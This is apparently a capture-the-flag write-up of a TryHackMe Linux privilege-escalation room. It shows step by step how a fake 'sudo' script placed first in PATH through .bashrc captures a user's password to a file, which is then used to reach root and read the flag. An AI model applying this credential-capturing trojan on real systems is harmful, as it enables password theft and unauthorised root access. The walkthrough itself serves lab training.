# TryHackMe: Eavesdropper 🕵️‍♂️

> A clever PATH hijacking exploit to capture a user's password and escalate to root.

| | |
|---|---|
| **Room URL** | [https://tryhackme.com/room/eavesdropper](https://tryhackme.com/room/eavesdropper) |
| **Difficulty** | Medium |
| **Category** | Linux Privilege Escalation |
| **Focus** | PATH Hijacking + Password Capture |
| **Tools Used** | `ssh`, `pspy`, `bash` |

---

## 🧠 Summary

In this room, we escalate from a low-privileged user (`frank`) to `root` by **eavesdropping on root's login-time processes**. We discover that `root` runs a `sudo` command during SSH login, which prompts `frank` for his password. By hijacking the `sudo` binary via `$PATH`, we capture that password and use it to gain root access.

---

## 🚀 Walkthrough

### 🔐 Step 1: Initial Access

We are provided with an SSH private key (`id_rsa`) for the user `frank`.

First, let's set the correct permissions for the key and log in:
```bash
chmod 600 id_rsa
ssh -i id_rsa frank@<target-ip>
```

Once logged in, we confirm our user identity:
```bash
whoami
# frank
```

### 🔍 Step 2: Enumeration with pspy

To see what's happening on the system, especially processes run by other users, we'll use `pspy` ([https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)).

First, we upload `pspy` to the target machine:
```bash
scp -i id_rsa pspy64 frank@<target-ip>:/tmp/
```

Then, we make it executable and run it:
```bash
chmod +x /tmp/pspy64
/tmp/pspy64
```

> **🔥 Key Discovery!**
> While `pspy` is running, we log in again via SSH in a separate terminal. We spot a crucial process:
> ```
> UID=0 PID=xxxx | sudo cat /etc/shadow
> ```
> This tells us that the `root` user automatically runs `sudo cat /etc/shadow` whenever `frank` logs in. Interestingly, this command still prompts `frank` for his own password. This is our entry point!

### 🧨 Step 3: The Vulnerability - PATH Hijacking

Linux uses the `$PATH` environment variable to find and execute commands. When a command like `sudo` is run without its full path (e.g., `/usr/bin/sudo`), the system searches for it in the directories listed in `$PATH`, in order.

If we can:
1. Create a malicious script named `sudo`.
2. Place it in a directory we can write to (like `/tmp`).
3. Add that directory to the beginning of our `$PATH`.

...our script will be executed instead of the real `sudo`!

### 🔐 Step 4: Exploitation - Capturing the Password

Let's build our trap.

**A. Create a Fake `sudo` Script**

In the `/tmp` directory, we'll create a script that captures any input and saves it to a file.

```bash
cd /tmp
nano sudo
```

Paste the following into the `sudo` file. This script will read a password without showing it on screen (`-sp`) and write it to `/tmp/pass.txt`.

```bash
#!/usr/bin/bash
read -sp 'Password: ' Password
echo $Password > /tmp/pass.txt
```

Make it executable:
```bash
chmod +x /tmp/sudo
```

**B. Modify `$PATH` to Hijack `sudo`**

Now, we prepend `/tmp` to our `$PATH`. This ensures the system finds our fake `sudo` before the real one.

To make this change persistent across logins, we add it to `~/.bashrc`:
```bash
echo 'export PATH=/tmp:$PATH' >> ~/.bashrc
```

**C. Trigger the Exploit**

All we have to do now is log out and log back in.
```bash
exit
ssh -i id_rsa frank@<target-ip>
```
When we log back in, the `root` user's automated command (`sudo cat /etc/shadow`) will execute our fake `sudo` script. It will prompt `frank` for his password, which will be captured and saved.

### 📦 Step 5: Retrieve the Password & Escalate

After logging back in, the password should be waiting for us in `/tmp/pass.txt`.

```bash
cat /tmp/pass.txt
# [REDACTED_PASSWORD]
```

Now that we have `frank`'s password, we can use it with the *real* `sudo` to become `root`.

```bash
/usr/bin/sudo su
# Enter the captured password
```

We should now have a root shell!
```bash
whoami
# root
```

### 🏁 Step 6: Capture the Root Flag

With root access, the final flag is ours.

```bash
cd /root
cat flag.txt
# flag{[REDACTED]}
```
